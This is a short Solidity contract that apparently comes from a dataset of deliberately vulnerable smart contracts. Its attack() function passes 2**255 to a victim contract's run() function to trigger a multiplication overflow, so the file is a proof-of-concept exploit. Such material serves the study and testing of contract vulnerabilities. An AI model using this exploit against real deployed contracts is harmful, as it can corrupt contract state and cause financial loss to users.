pragma solidity ^0.4.19;

import "../dataset/arithmetic/integer_overflow_mul.sol";

contract IntegerOverflowMulAttacker {
    IntegerOverflowMul victimContract;

    constructor(address _victimAddress) public {
        victimContract = IntegerOverflowMul(_victimAddress);
    }

    function attack() public {
        uint256 largeNumber = 2 ** 256 / 2;
        victimContract.run(largeNumber);
    }
}
